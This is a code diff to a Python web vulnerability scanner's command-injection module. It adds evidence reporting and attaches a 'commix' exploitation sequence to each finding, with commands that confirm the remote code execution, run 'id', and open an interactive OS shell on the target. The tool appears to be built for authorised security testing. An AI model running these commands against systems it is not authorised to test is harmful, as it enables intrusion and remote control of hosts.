@@ -16,7 +16,7 @@ import re
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from scanner.engine import Finding, Severity, ScanEngine
-from scanner.vulns._common import Injector, is_safe_mode, iter_injectors, timed_get
+from scanner.vulns._common import Injector, evidence, is_safe_mode, iter_injectors, timed_get
 
 MODULE = "command_injection"
 _TIME_LONG, _TIME_SHORT, _TIME_MAX = 5, 2, 8
@@ -37,7 +37,21 @@ _TIME_PAYLOADS = [
 ]
 
 
-def _finding(inj: Injector, payload: str, technique: str, signal: str) -> Finding:
+def _exploitation_steps(inj: Injector, payload: str) -> list[dict]:
+    """The commix kill chain to weaponise a confirmed OS command injection. Authorised targets only."""
+    target = (inj.proof(payload) if inj.proof else None) or inj.url or "<injectable request>"
+    return [
+        {"step": 1, "description": "Confirm the RCE and auto-detect the injection technique.",
+         "command": f'commix -u "{target}" --batch'},
+        {"step": 2, "description": "Run a single OS command as proof of execution.",
+         "command": f'commix -u "{target}" --batch --os-cmd="id"'},
+        {"step": 3, "description": "Drop into an interactive pseudo-shell on the host.",
+         "command": f'commix -u "{target}" --batch --os-shell'},
+    ]
+
+
+def _finding(inj: Injector, payload: str, technique: str, signal: str,
+             proof_lines: list[str] | None = None) -> Finding:
     proof_url = inj.proof(payload) if inj.proof else None
     commix = f'commix -u "{proof_url}"' if proof_url else None
     return Finding(
@@ -50,7 +64,9 @@ def _finding(inj: Injector, payload: str, technique: str, signal: str) -> Findin
         recommendation=("Never pass user input to a shell. Use language-native APIs with an argument "
                         "array (no shell), validate against an allowlist, and strip shell metacharacters."),
         raw={"location": inj.label, "parameter": inj.param, "technique": technique,
-             "payload": payload, "proof_url": proof_url, "commix": commix, "confidence": "high"},
+             "payload": payload, "proof_url": proof_url, "commix": commix, "confidence": "high",
+             "evidence": proof_lines or [f"injected into {inj.label}: {payload}"],
+             "exploitation": _exploitation_steps(inj, payload)},
     )
 
 
@@ -59,7 +75,9 @@ def _test(engine: ScanEngine, inj: Injector, allow_time: bool) -> Finding | None
     for payload in _OUTPUT_PAYLOADS:
         resp = inj.inject(payload)
         if resp is not None and (m := _OUTPUT_RE.search(resp.text)):
-            return _finding(inj, payload, "output-based", m.group(0))
+            return _finding(inj, payload, "output-based", m.group(0),
+                            evidence(inj, payload, resp,
+                                     indicator=f"command output in response: {m.group(0)}"))
 
     # 2. Time-based (URL parameters only — needs a timeable proof URL)
     if allow_time and inj.proof:
@@ -71,7 +89,12 @@ def _test(engine: ScanEngine, inj: Injector, allow_time: bool) -> Finding | None
                     continue
                 short_t = timed_get(engine, inj.proof(tmpl.format(t=_TIME_SHORT)))
                 if short_t is not None and (long_t - short_t) >= (_TIME_LONG - _TIME_SHORT) - 1.5:
-                    return _finding(inj, tmpl.format(t=_TIME_LONG), "time-based", "")
+                    long_payload = tmpl.format(t=_TIME_LONG)
+                    return _finding(
+                        inj, long_payload, "time-based", "",
+                        [f"injected into {inj.label}: {long_payload}",
+                         f"matched: response delay scales — {long_t:.1f}s (t={_TIME_LONG}) vs "
+                         f"{short_t:.1f}s (t={_TIME_SHORT}) vs {base:.1f}s baseline"])
     return None
 
 
